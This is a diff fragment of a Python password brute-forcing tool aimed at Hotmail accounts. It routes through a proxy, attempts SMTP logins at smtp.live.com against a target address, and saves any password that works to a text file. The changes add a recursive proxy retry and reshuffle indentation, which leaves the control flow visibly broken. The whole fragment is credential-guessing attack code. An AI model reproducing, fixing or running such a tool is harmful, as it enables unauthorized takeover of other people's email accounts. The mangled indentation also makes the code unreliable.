@@ -94,9 +94,15 @@ def proxy():
     try:
         checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=10)
     except:
+        return proxy()
 
-    if options.hotmail == None :
+
+        
+if options.hotmail == None :    
+        
+                    print(use.usage)
                     exit()       
+			
     elif options.hotmail != None or options.gmail == None:
         smtp_srverH= smtplib.SMTP('smtp.live.com', 587)
         smtp_srverH.ehlo()
@@ -119,9 +125,8 @@ def proxy():
                     Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+password+"\n")
                 except smtplib.SMTPAuthenticationError:
                     print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
-   
+    
 
-                    
 
 else:
     print(use.usage)
